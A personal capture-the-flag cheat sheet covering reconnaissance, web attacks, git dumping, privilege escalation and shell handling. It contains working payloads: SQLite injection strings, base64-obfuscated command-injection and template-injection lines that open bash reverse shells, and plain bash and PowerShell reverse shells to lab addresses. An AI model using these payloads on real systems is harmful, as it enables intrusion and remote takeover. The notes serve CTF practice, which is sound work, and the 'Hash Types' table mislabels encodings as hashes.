*CTF Tips*
- 👨‍💻By: Nathan Hailu
- 🗒Description: A CTF tips collected while playing CTF
- 📅Date: Sun 10/25/2022
----

# Methodologies
## Machine CTF
- Nmap scan 
	- one -p-
	- one normal -vvv
- directory scan
	- dirb
	- dirsearch
- subdomain scan
	- ffuf - seclists
## Web CTF
### A) File Inclusion / path traversal
    - IF the site have file opening method like => ...?home=about
      - TRY: home=`php://filter/convert.base64-encode/resource=index`
### B) IDOR


### C) SQL-injection
- If the database is **sqlite**
	- a' || (select sqlite_version()));--
	- a' || (select sql from sqlite_master));--
	- a' || (select password from xde43_users where role="admin"));--
- Try to inject on the **id** parameter
- When you get errors like "HY000 1 unrecognized token: "'" "
	- Try to use sqlmap  =>  sqlmap -u link --dump-all
### D) XSS
- Use <img\> tags rather than <script\> U can upload svg file (image) then do xss with svg files
### E) Broken Access Control
- **changing** role of 'user' to 'admin' will give u the flag!
### F) Obfuscation
- Some websites give you JS code for hint and they will **Obfuscate** it so to decode that use
      - This site:  https://lelinhtinh.github.io/de4js/ 
        - ON THIS the obfuscation looks js code but it is human unreadable form.
    - If you see []+[][[+]}]... kind of obfuscate it is **JSFUCK**.
    - Another Site: http://www.jsnice.org/ 

### G) File Upload
- If the Uploaded file path *is known*
	- http://example.com/data/shell.pdf
	- **it wont run the php code, so try**
	- => http://example.com/index.php?data/shell.pdf

### H) Host Headers
    - If the hint have language staff
      - change the accept-language to the hints.

### I) PHP secure code
- 
    
## Git CTF
- get the .git link
- download it with gitdumper.sh
	  `gitdumper.sh http://167.99.135.253/.git clone-folder`
- extract the main file with extractor.sh
	  `extractor.sh clone-folder pre`
- Go to the pre folder and check if there is flag or username,password
- to download all files of git recursively
	  `wget -r http://web.com/.git`
- if there is any commit
	  `git log`   =>   and look for something jucie throught the commit message
 - if there any copy the commit id and
	  `git show <id>`
- some CTF's will give u the source code and the encrypted flag on some place, and the decrypting function will be on the source code.
  - so edit the code(like replaceing the encrypt function to decrypt) and run it
		  `php index.php`
```bash
# Commands
git log
git show <>
git restore <>   ->  will restore deleted files
git status
```

# REMEMBERS
- Always when you get programs check for their version and find if there is any exploit for them
- For directory search
	- dirb
	- dirsearch
- On command Injection
	- for 1 liner you can use \${IFS} to replace the whitespace `kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMTQvOTk5OSAwPiYxCg="|base64${IFS}-d|bash;
- extracting jar file
`jar tvf jarfile.jar
- On PGP key naming, the uid is in text with out <, > signs but it works fine with `{{7*7}}` huh SSTI😁
- if you see flash think about SSTI
	-`{{request.application.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMTQvNDAwMCAwPiYxCg==" | base64 -d | bash').read()}}`
- Latex Exploit
	- https://exploit-notes.hdks.org/exploit/web/security-risk/latex-injection/
- If you are on Apache server sensetive files can be stored in the following paths, so if u got reading permission/method read them
	- /var/www/dev/.htaccess
	- /var/www/html/.htaccess
	- /var/www/stats/.htaccess
	- .htaccess can be `.htpasswd`
## Priv - Esc
- Check files in /tmp , /opt
- linpeas
	- check env
	- os releases
	- suid bits
	- sudo 
- pspy64

## Reverse Shells
- bash
	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
- powershell
	- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

## Upgrading TTY 
- Using #pty
	- On VIctim
		- `python -c 'import pty; pty.spawn("/bin/bash")` 
		- then make it to background process (ctrl + Z)
	- On Attacker
		- You can use the following![[Pasted image 20231019095240.png]]
- We can get a problem on the reverse shell and out terminal size for this we can fix with
	- Checking our terminal
		- `echo $TERM` -> #tmux-256color
		- `stty size` -> <row\> <col\>
	- On the reverse shell
		- `export TERM=<YOURVALUE>`
		- `stty rows <row> columns <col>`
## Hash Types

```
Base2	01100010 01110010 01100101 01100001 01101011 01101001 01110100
Base8	142 162 145 141 153 151 164
Base16	62 72 65 61 6b 69 74
Base32	MJZGKYLLNF2A====
Base58	4jP4KDubX1
Base62	22udqyscMu
Base64	YnJlYWtpdA==
Base85	@WH$gCM@k
Base91	%zmfv;:YH
```
